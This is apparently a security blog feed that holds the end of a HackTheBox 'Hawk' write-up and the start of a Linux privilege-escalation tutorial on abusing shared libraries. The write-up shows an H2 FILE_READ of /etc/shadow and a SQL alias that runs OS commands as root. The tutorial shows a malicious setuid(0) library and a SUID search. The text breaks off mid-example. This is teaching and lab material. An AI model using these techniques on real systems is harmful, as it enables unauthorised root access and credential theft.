&lt;p&gt;I changed the &lt;strong&gt;database URL&lt;/strong&gt; to a non-existing database and the connection test returns &lt;span style=&quot;color:Red&quot;&gt;“Success”&lt;/span&gt;. Now, &lt;span style=&quot;color:Green&quot;&gt;I can connect to this new database&lt;/span&gt;. From there, I can &lt;strong&gt;execute H2 functions&lt;/strong&gt; like &lt;code class=&quot;highlighter-rouge&quot;&gt;FILE_READ('/etc/shadow',NULL)&lt;/code&gt; for instance.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/h2-fileread.png&quot; alt=&quot;H2 File read&quot; title=&quot;H2 File read&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Replace &lt;strong&gt;/etc/shadow&lt;/strong&gt; by &lt;strong&gt;/root/root.txt&lt;/strong&gt; and you’ll &lt;span style=&quot;color:Green&quot;&gt;get the root flag!&lt;/span&gt; :checkered_flag:&lt;/p&gt;

&lt;p&gt;Ok we can read protected files, but &lt;span style=&quot;color:Red&quot;&gt;can we get a root shell?&lt;/span&gt;&lt;/p&gt;

&lt;h3 id=&quot;getting-a-root-shell&quot;&gt;Getting a Root Shell&lt;/h3&gt;

&lt;p&gt;Still connected to our &lt;em&gt;boiteaklou database&lt;/em&gt;, we can &lt;strong&gt;create an alias&lt;/strong&gt; with the following command:&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ALIAS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHELLEXEC&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellexec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scanner&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scanner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;useDelimiter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;}$$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, &lt;span style=&quot;color:Green&quot;&gt;we can trigger the code execution&lt;/span&gt; by &lt;strong&gt;calling this alias&lt;/strong&gt; and specifying our command as an argument:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/h2-rce.png&quot; alt=&quot;H2 RCE&quot; title=&quot;H2 RCE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span style=&quot;color:Green&quot;&gt;It’s kind of a root shell!&lt;/span&gt; If you want something more interactive, it can be done easily from what we have and I’m sure you will find a way :wink:&lt;/p&gt;

&lt;p&gt;I hope you enjoyed this writeup and see you next time guys!&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hawk has been retired from HackTheBox active machines so here is my writeup explaining how I rooted this machine. In this article, we will crack a salted OpenSSL encrypted file, upload a reverse shell to an instance of Drupal 7 CMS. Then, we will use a SSH port-forwarding trick to access a H2 database console disallowing remote connections and exploit this app to get root on the machine. Enjoy your reading!</summary></entry><entry><title type="html">Linux Privilege Escalation: Abusing shared libraries</title><link href="http://localhost:4000/Abusing-Shared-Libraries.html" rel="alternate" type="text/html" title="Linux Privilege Escalation: Abusing shared libraries" /><published>2018-11-21T13:00:00+01:00</published><updated>2018-11-21T13:00:00+01:00</updated><id>http://localhost:4000/Abusing-Shared-Libraries</id><content type="html" xml:base="http://localhost:4000/Abusing-Shared-Libraries.html">&lt;p&gt;Linux applications often use dynamically linked shared object libraries. These libraries allow code flexibility but they have their drawbacks… &lt;span style=&quot;color:Maroon&quot;&gt;In this article, we will study the weaknesses of shared libraries and how to exploit them in many different ways.&lt;/span&gt; Each exploit will be illustrated by a concrete example, which should make you understand how to reproduce it. I’ll give recommendations on how to protect your system against it in the final part of the article.
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#shared-libraries-in-short&quot; id=&quot;markdown-toc-shared-libraries-in-short&quot;&gt;Shared Libraries in short&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#dynamic-linking-in-linux&quot; id=&quot;markdown-toc-dynamic-linking-in-linux&quot;&gt;Dynamic Linking in Linux&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#find-a-vulnerable-application&quot; id=&quot;markdown-toc-find-a-vulnerable-application&quot;&gt;Find a vulnerable application&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#but-can-we-exploit-it&quot; id=&quot;markdown-toc-but-can-we-exploit-it&quot;&gt;But can we exploit it?&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-write-permissions-on-lib-or-usrlib&quot; id=&quot;markdown-toc-1-write-permissions-on-lib-or-usrlib&quot;&gt;1. Write permissions on /lib or /usr/lib&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-ld_preload-and-ld_library_path&quot; id=&quot;markdown-toc-2-ld_preload-and-ld_library_path&quot;&gt;2. LD_PRELOAD and LD_LIBRARY_PATH&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#ld_preload&quot; id=&quot;markdown-toc-ld_preload&quot;&gt;LD_PRELOAD&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ld_library_path&quot; id=&quot;markdown-toc-ld_library_path&quot;&gt;LD_LIBRARY_PATH&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-setuid-bit-on-ldconfig&quot; id=&quot;markdown-toc-3-setuid-bit-on-ldconfig&quot;&gt;3. Setuid bit on ldconfig&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#alternative-to-etcldsoconf&quot; id=&quot;markdown-toc-alternative-to-etcldsoconf&quot;&gt;Alternative to /etc/ld.so.conf&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#how-can-we-defend-against-this&quot; id=&quot;markdown-toc-how-can-we-defend-against-this&quot;&gt;How can we defend against this?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 class=&quot;no_toc&quot; id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;

&lt;p&gt;I won’t describe here the full details of how libraries work in Linux, my goal is to give you the necessary amount of information so you can understand the exploit and be able to reproduce it.&lt;/p&gt;

&lt;h2 id=&quot;shared-libraries-in-short&quot;&gt;Shared Libraries in short&lt;/h2&gt;

&lt;p&gt;A library is &lt;strong&gt;a file containing data or compiled code&lt;/strong&gt; that is used by developers to avoid re-writing the same pieces of code you use in multiple programs (modular programming). It can contain classes, methods or data structures and will be linked to the program that will use it at the compilation time.&lt;/p&gt;

&lt;p&gt;There are different types of libraries in Linux:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Static libraries (&lt;strong&gt;.a&lt;/strong&gt; extension)&lt;/li&gt;
  &lt;li&gt;Dynamically linked shared object libraries (&lt;strong&gt;.so&lt;/strong&gt; extension)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Static libraries will become part of the application so they will be &lt;strong&gt;unalterable&lt;/strong&gt; once the compilation done. Every running program has its own copy of the library, which won’t be interesting for us.&lt;/p&gt;

&lt;p&gt;Dynamic libraries can be used in two ways:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Dynamic linking (dynamically linked at run time).&lt;/li&gt;
  &lt;li&gt;Dynamic loading (dynamiclly loaded and user under program control).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;They seem much more attractive because of their dynamic nature. If we manage to &lt;strong&gt;alter the content of a dynamic library&lt;/strong&gt;, we should be able to control the execution of the calling program and that’s what we want!&lt;/p&gt;

&lt;p&gt;For that reason, we will focus on &lt;strong&gt;dynamic linking&lt;/strong&gt; in this article.&lt;/p&gt;

&lt;h2 id=&quot;dynamic-linking-in-linux&quot;&gt;Dynamic Linking in Linux&lt;/h2&gt;

&lt;p&gt;Since these libraries are dynamically linked to the program, we have to specify their location so the Operating System will know where to look for when the program is executed.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt; is the GNU linker. Its man page gives us the following methods for specifying the location of dynamic libraries:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Using &lt;strong&gt;-rpath&lt;/strong&gt; or &lt;strong&gt;-rpath-link&lt;/strong&gt; options when compiling the application.&lt;/li&gt;
  &lt;li&gt;Using the environment variable &lt;strong&gt;LD_RUN_PATH&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Using the environment variable &lt;strong&gt;LD_LIBRARY_PATH&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Using the value of &lt;strong&gt;DT_RUNPATH&lt;/strong&gt; or &lt;strong&gt;DT_PATH&lt;/strong&gt;, set with &lt;strong&gt;-rpath&lt;/strong&gt; option.&lt;/li&gt;
  &lt;li&gt;Putting libraries in default &lt;strong&gt;/lib&lt;/strong&gt; and &lt;strong&gt;/usr/lib&lt;/strong&gt; directories.&lt;/li&gt;
  &lt;li&gt;Specifying a directory containing our libraries in &lt;strong&gt;/etc/ld.so.conf&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;span style=&quot;color:red&quot;&gt;As an attacker, our objective is to control one of these methods in order to replace an existing dynamic library by a malicious one.&lt;/span&gt; By default, security measures have been put in place in Linux. However, we will see that there are so many ways to make this exploit possible…&lt;/p&gt;

&lt;h2 id=&quot;find-a-vulnerable-application&quot;&gt;Find a vulnerable application&lt;/h2&gt;

&lt;p&gt;Since we want to escalate privileges, it is mandatory to find an executable file with &lt;strong&gt;setuid bit&lt;/strong&gt; enable. This bit allows anyone to execute the program with the same permissions as the file’s owner.&lt;/p&gt;

&lt;p&gt;We can find those files using the following command:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s 2&amp;gt;/dev/null | xargs &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We combine it to &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -l&lt;/code&gt; so we can check that the file’s owner is root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~/Abusing-Shared-Libraries&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s 2&amp;gt;/dev/null | xargs &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        30112 Jul 12  2016 /bin/fusermount
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        34812 May 16  2018 /bin/mount
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root       157424 Jan 28  2017 /bin/ntfs-3g
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        38932 May  7  2014 /bin/ping
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        43316 May  7  2014 /bin/ping6
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        38900 May 17  2017 /bin/su
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        26492 May 16  2018 /bin/umount
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root   root          387 Jan 15  2018 /sbin/ldconfig
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root   root       831936 Jan 15  2018 /sbin/ldconfig.real
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 daemon daemon      50748 Jan 14  2016 /usr/bin/at
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        48264 May 17  2017 /usr/bin/chfn
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        39560 May 17  2017 /usr/bin/chsh
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        78012 May 17  2017 /usr/bin/gpasswd
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root   root         7376 Nov 18 22:03 /usr/bin/myexec      &lt;span class=&quot;c&quot;&gt;# Hmm... suspicious&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        36288 May 17  2017 /usr/bin/newgidmap
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        34680 May 17  2017 /usr/bin/newgrp
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        36288 May 17  2017 /usr/bin/newuidmap
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        53128 May 17  2017 /usr/bin/passwd
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        18216 Jul 13 15:47 /usr/bin/pkexec
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root       159852 Jul  4  2017 /usr/bin/sudo
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr--&lt;/span&gt; 1 root   messagebus  46436 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root         5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        42396 Jun 14  2017 /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root       513528 Jan 18  2018 /usr/lib/openssh/ssh-keysign
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        13960 Jul 13 15:47 /usr/lib/policykit-1/polkit-agent-helper-1
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root   root       105004 Jul 19 13:22 /usr/lib/snapd/snap-confine
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/myexec&lt;/code&gt; has the setuid bit enabled and is owned by root. &lt;em&gt;(By the way, this specific program caught our attention because it’s the only unknown program of the list. If you have any doubt on an application, google should help you find out if it’s a regular linux application or not.)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Is there any chance that &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/myexec&lt;/code&gt; uses &lt;strong&gt;shared objects&lt;/strong&gt;?
Let’s check this with &lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~/Abusing-Shared-Libraries&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb779b000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /usr/lib/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb778e000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;# Looks like a custom library&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb75d8000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb779c000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see &lt;strong&gt;libcustom.so&lt;/strong&gt;, which looks pretty custom (Oh really?). This executable file gathers all the pre-requisites. &lt;span style=&quot;color:red&quot;&gt;However, we still need to find a way to inject our malicious dynamic library.&lt;/span&gt;&lt;/p&gt;

&lt;h2 id=&quot;but-can-we-exploit-it&quot;&gt;But can we exploit it?&lt;/h2&gt;

&lt;p&gt;As always when it comes to privilege escalation, &lt;strong&gt;everything starts from a misconfiguration&lt;/strong&gt;.
From the moment we find a setuid file using shared objects, there are at least 4 possible misconfigurations that could lead to privilege escalation. I’ll detail here the three working exploits that I’ve already seen on a machine. To those detailed below, you can add the &lt;strong&gt;RPATH&lt;/strong&gt; technique, which is very similar to the second method I present: LD_PRELOAD and LD_LIBRARY_PATH.&lt;/p&gt;

&lt;p&gt;For the need of the examples you’ll find below, I’ve created the setuid ELF executable &lt;strong&gt;myexec&lt;/strong&gt; linked with the dynamic library &lt;strong&gt;libcustom.so&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;# myexec.c
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &quot;libcustom.h&quot;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Welcome to my amazing application!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;say_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;# libcustom.c
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;say_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello buddy!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But also an evil library that we will try to inject in place of the real libcustom.so:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;# evil libcustom.c
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;say_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I'm the bad library&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This one is only printing a different output but be sure that if we manage to execute this code, we could obviously pop a shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;,NULL,NULL);&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now let’s see which configuration mistakes we could exploit…&lt;/p&gt;

&lt;h3 id=&quot;1-write-permissions-on-lib-or-usrlib&quot;&gt;1. Write permissions on /lib or /usr/lib&lt;/h3&gt;

&lt;p&gt;Even though this one seems pretty unlikely, it could happen that a user has &lt;strong&gt;write permissions&lt;/strong&gt; on one these folders.
In that case, the attacker could easily &lt;strong&gt;craft a malicious libcustom library&lt;/strong&gt; and place it into &lt;strong&gt;/lib&lt;/strong&gt; or &lt;strong&gt;/usr/lib&lt;/strong&gt;. Of course, he would have deleted the original library first.&lt;/p&gt;

&lt;p&gt;When executing &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/myexec&lt;/code&gt;, &lt;span style=&quot;color:red&quot;&gt;the malicious library will be called instead.&lt;/span&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-ld_preload-and-ld_library_path&quot;&gt;2. LD_PRELOAD and LD_LIBRARY_PATH&lt;/h3&gt;

&lt;p&gt;I decided to present this technique as it’s a must-known, even though it won’t work in our case :laughing:. Let me explain why.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;LD_LIBRARY_PATH&lt;/strong&gt; and &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; are environment variables. The first one allows you to indicate an &lt;strong&gt;additionnal directory to search for libraries&lt;/strong&gt; and the second specifies a library &lt;span style=&quot;color:red&quot;&gt;which will be loaded prior to any other library when the program gets executed.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;These variables modify the environment of the current user, but when you execute a setuid program, it is done in the context of the owner, which hasn’t necessarily set LD_LIBRARY_PATH or LD_PRELOAD. Let me show you an example.&lt;/p&gt;

&lt;p&gt;I’ve created 2 executables: 1 with setuid bit enabled and 1 without.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~/Abusing-Shared-Libraries&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /usr/bin/myexec&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root root 7376 Nov 18 22:03 /usr/bin/myexec	&lt;span class=&quot;c&quot;&gt;# Setuid&lt;/span&gt;
